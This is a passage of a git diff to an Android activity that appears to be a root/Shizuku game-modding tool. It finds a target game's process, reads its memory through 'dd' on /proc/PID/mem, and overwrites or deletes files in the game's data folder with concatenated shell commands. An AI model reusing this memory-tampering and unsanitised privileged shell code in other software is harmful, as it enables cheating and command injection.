         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             Toast.makeText(this, "请授予悬浮窗权限", Toast.LENGTH_SHORT).show();
-            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
-            startActivityForResult(intent, REQUEST_CODE_FLOAT_WINDOW);
+            startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())), REQUEST_CODE_FLOAT_WINDOW);
             return;
         }
-
         Intent serviceIntent = new Intent(this, FloatWindowService.class);
         serviceIntent.putExtra("BASE_ADDRESS", hexAddress);
         startService(serviceIntent);
-
-        PackageManager packageManager = getPackageManager();
-        Intent launchIntent = packageManager.getLaunchIntentForPackage(TARGET_PKG);
+        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(TARGET_PKG);
         if (launchIntent != null) startActivity(launchIntent);
     }
 
-    // --- 内存工具类 (Shell 实现) ---
     private int getProcessID(String pkgName) {
         try {
             Process p = Runtime.getRuntime().exec("su");
@@ -560,10 +644,7 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
             os.flush();
             BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
             String line = reader.readLine();
-            if (line != null && !line.trim().isEmpty()) {
-                String[] pids = line.trim().split("\\s+");
-                return Integer.parseInt(pids[0]);
-            }
+            if (line != null && !line.trim().isEmpty()) return Integer.parseInt(line.trim().split("\\s+")[0]);
         } catch (Exception e) {}
         return -1;
     }
@@ -579,14 +660,12 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
             boolean foundSo = false;
             while ((line = reader.readLine()) != null) {
                 if (line.contains(moduleName)) foundSo = true;
-                // 找到模块后，向下寻找第一个 [anon:.bss] 段
                 if (foundSo && line.contains("[anon:.bss]")) {
-                    String addressRange = line.substring(0, line.indexOf(" "));
-                    return new BigInteger(addressRange.substring(0, addressRange.indexOf("-")), 16).longValue();
+                    String range = line.substring(0, line.indexOf(" "));
+                    return new BigInteger(range.substring(0, range.indexOf("-")), 16).longValue();
                 }
             }
-            p.waitFor();
-        } catch (Exception e) { e.printStackTrace(); }
+        } catch (Exception e) {}
         return 0L;
     }
 
@@ -601,104 +680,63 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                 if (r == -1) break;
                 read += r;
             }
-            p.waitFor();
             if (read == 8) return ByteBuffer.wrap(buffer).order(ByteOrder.LITTLE_ENDIAN).getLong();
-        } catch (Exception e) { e.printStackTrace(); }
+        } catch (Exception e) {}
         return -1L;
     }
 
-    private float readMemoryFloat(int pid, String hexAddress) {
-        try {
-            long address = new BigInteger(hexAddress, 16).longValue();
-            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "dd if=/proc/" + pid + "/mem bs=1 count=4 skip=" + address + " 2>/dev/null"});
-            InputStream in = p.getInputStream();
-            byte[] buffer = new byte[4];
-            int read = 0;
-            while (read < 4) {
-                int r = in.read(buffer, read, 4 - read);
-                if (r == -1) break;
-                read += r;
-            }
-            p.waitFor();
-            if (read == 4) return ByteBuffer.wrap(buffer).order(ByteOrder.LITTLE_ENDIAN).getFloat();
-        } catch (Exception e) { e.printStackTrace(); }
-        return -9999f;
-    }
-
     // ==========================================
-    // 5. 终极文件读写 API (自动适配 Root/Shizuku/SAF)
+    // 文件读写底层 API (Root/Shizuku/SAF)
     // ==========================================
 
-    /**
-     * 将本地文件推送到游戏的 Data 目录中
-     * @param localFile 本地源文件
-     * @param targetRelativePath 目标相对路径 (如: files/...)
-     */
     private boolean copyToAndroidData(File localFile, String targetRelativePath) {
-        // 第一顺位：利用 Root 或 Shizuku 直接覆盖
         String fullPath = "/storage/emulated/0/Android/data/" + TARGET_PKG + "/" + targetRelativePath;
         String dirOnly = fullPath.substring(0, fullPath.lastIndexOf("/"));
-        if (executePrivilegedCommand("mkdir -p \"" + dirOnly + "\" && cp -f \"" + localFile.getAbsolutePath() + "\" \"" + fullPath + "\"")) {
-            return true;
-        }
+        if (executePrivilegedCommand("mkdir -p \"" + dirOnly + "\" && cp -f \"" + localFile.getAbsolutePath() + "\" \"" + fullPath + "\"")) return true;
 
-        // 第二顺位：降级使用 SAF 授权流写入 (兼容无Root的安卓10/11+)
         String uriStr = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getString(DATA_URI_KEY, null);
         if (uriStr != null) {
             try {
                 DocumentFile targetDoc = getDocumentFileSafely(targetRelativePath, true, false);
                 if (targetDoc != null) {
-                    OutputStream out = getContentResolver().openOutputStream(targetDoc.getUri(), "wt"); // wt: 清空重写
-                    InputStream in = new FileInputStream(localFile);
-                    byte[] buffer = new byte[8192];
-                    int read;
-                    while ((read = in.read(buffer)) != -1) out.write(buffer, 0, read);
-                    in.close();
-                    if (out != null) out.close();
-                    return true;
+                    try (OutputStream out = getContentResolver().openOutputStream(targetDoc.getUri(), "wt");
+                         InputStream in = new FileInputStream(localFile)) {
+                        byte[] buffer = new byte[8192];
+                        int read;
+                        while ((read = in.read(buffer)) != -1) out.write(buffer, 0, read);
+                        return true;
+                    }
                 }
             } catch (Exception e) { e.printStackTrace(); }
         }
         return false;
     }
 
-    /**
-     * 从游戏的 Data 目录中拉取文件到本地
-     */
     private boolean copyFromAndroidData(String sourceRelativePath, File localDest) {
-        // 优先使用命令拷贝
         String fullPath = "/storage/emulated/0/Android/data/" + TARGET_PKG + "/" + sourceRelativePath;
-        if (executePrivilegedCommand("cp -f \"" + fullPath + "\" \"" + localDest.getAbsolutePath() + "\"")) {
-            return true;
-        }
+        if (executePrivilegedCommand("cp -f \"" + fullPath + "\" \"" + localDest.getAbsolutePath() + "\"")) return true;
 
-        // 降级使用 SAF 流读取
         String uriStr = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getString(DATA_URI_KEY, null);
         if (uriStr != null) {
             try {
                 DocumentFile sourceDoc = getDocumentFileSafely(sourceRelativePath, false, false);
                 if (sourceDoc != null && sourceDoc.exists()) {
-                    InputStream in = getContentResolver().openInputStream(sourceDoc.getUri());
-                    OutputStream out = new FileOutputStream(localDest);
-                    byte[] buffer = new byte[8192];
-                    int read;
-                    while ((read = in.read(buffer)) != -1) out.write(buffer, 0, read);
-                    if (in != null) in.close();
-                    out.close();
-                    return true;
+                    try (InputStream in = getContentResolver().openInputStream(sourceDoc.getUri());
+                         OutputStream out = new FileOutputStream(localDest)) {
+                        byte[] buffer = new byte[8192];
+                        int read;
+                        while ((read = in.read(buffer)) != -1) out.write(buffer, 0, read);
+                        return true;
+                    }
                 }
             } catch (Exception e) { e.printStackTrace(); }
         }
         return false;
     }
 
-    /**
-     * 从游戏的 Data 目录中删除指定文件
-     */
     private boolean deleteFromAndroidData(String relativePath) {
         String fullPath = "/storage/emulated/0/Android/data/" + TARGET_PKG + "/" + relativePath;
         if (executePrivilegedCommand("rm -f \"" + fullPath + "\"")) return true;
-
         try {
             DocumentFile target = getDocumentFileSafely(relativePath, false, false);
             if (target != null && target.exists()) return target.delete();
@@ -706,54 +744,35 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         return false;
     }
 
-    /**
-     * SAF 目录解析引擎：利用 URI 逐层深入寻找文件，支持自动创建缺失文件夹
-     */
     private DocumentFile getDocumentFileSafely(String relativePath, boolean createIfMissing, boolean isDirectory) {
         String uriStr = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getString(DATA_URI_KEY, null);
         if (uriStr == null) return null;
-
         DocumentFile current = DocumentFile.fromTreeUri(this, Uri.parse(uriStr));
         if (current == null) return null;
-
         String[] parts = relativePath.split("/");
         for (int i = 0; i < parts.length; i++) {
             String part = parts[i];
             if (part.isEmpty()) continue;
-
             DocumentFile next = current.findFile(part);
             if (next == null) {
                 if (createIfMissing) {
-                    if (i == parts.length - 1 && !isDirectory) {
-                        next = current.createFile("*/*", part); // 最后一层创建文件
-                    } else {
-                        next = current.createDirectory(part);   // 路径中途创建文件夹
-                    }
-                } else {
-                    return null;
-                }
+                    next = (i == parts.length - 1 && !isDirectory) ? current.createFile("*/*", part) : current.createDirectory(part);
+                } else return null;
             }
             current = next;
         }
         return current;
     }
 
-    // ==========================================
-    // 6. 系统辅助与权限管理
-    // ==========================================
     private boolean executePrivilegedCommand(String command) {
         try {
             if (Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED) {
-                Process p = null;
-                try {
-                    Method m = Shizuku.class.getDeclaredMethod("newProcess", String[].class, String[].class, String.class);
-                    m.setAccessible(true);
-                    p = (Process) m.invoke(null, new Object[]{new String[]{"sh", "-c", command}, null, null});
-                    return p.waitFor() == 0;
-                } catch (Exception e) {} finally { if (p != null) p.destroy(); }
+                Method m = Shizuku.class.getDeclaredMethod("newProcess", String[].class, String[].class, String.class);
+                m.setAccessible(true);
+                Process p = (Process) m.invoke(null, new Object[]{new String[]{"sh", "-c", command}, null, null});
+                return p.waitFor() == 0;
             }
         } catch (Throwable t) {}
-
         if (new RootBeer(this).isRooted()) {
             try {
                 Process p = Runtime.getRuntime().exec("su");
@@ -806,7 +825,6 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
     private void copyAssetsToExternalFilesDir() {
         if (getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getBoolean(PREF_ASSETS_COPIED, false)) return;
         File targetDir = getExternalFilesDir(null);
-        if (targetDir == null) return;
         if (!targetDir.exists()) targetDir.mkdirs();
         try {
             String[] files = getAssets().list("");
@@ -837,9 +855,7 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
     }
 
     private void handleRoot() { checkHasPermission(); }
-
     private void onRequestPermissionsResult(int c, int r) { if (c == REQUEST_CODE_SHIZUKU_PERMISSION) checkHasPermission(); }
-
     private int dpToPx(int dp) { return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dp, getResources().getDisplayMetrics()); }
 
     private void showImagePopup(FunctionConfig config) {
